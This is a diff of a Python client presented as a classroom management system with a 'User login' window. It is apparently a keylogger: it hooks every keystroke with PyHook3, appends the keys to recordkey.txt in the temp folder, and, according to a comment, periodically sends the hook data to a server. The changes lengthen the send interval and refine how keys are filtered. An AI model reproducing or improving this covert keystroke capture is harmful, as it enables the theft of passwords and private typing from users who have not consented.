@@ -15,7 +15,7 @@ import ctypes
 import pythoncom
 import PyHook3 as pyHook
 
-IntervalTime = 5 #每隔这些时间。向服务器发送键盘钩子数据
+IntervalTime = 50 #每隔这些时间。向服务器发送键盘钩子数据
 root = tkinter.Tk(screenName='User login')        #创建应用程序窗口
 root.title('课堂管理系统客户端')
 root.geometry('320x150+500+300')
@@ -183,6 +183,17 @@ def sendkey():
 
 def onKeyboardEvent(event):
     key = event.Key
+    print(key)
+    if key in ['Space','Tab']:
+        key = ' '
+    elif len(key)>1:
+        key = ""
+    # if key == 'Space':
+    #     key = " "
+    # elif key == "Tab":
+    #     key = " "
+    # elif key =="LShift" or key == "RShift":
+    #     key ==""   
     path = os.getenv('temp')
     filename = path + '\\' + 'recordkey.txt'
     with open(filename, 'a+') as f:
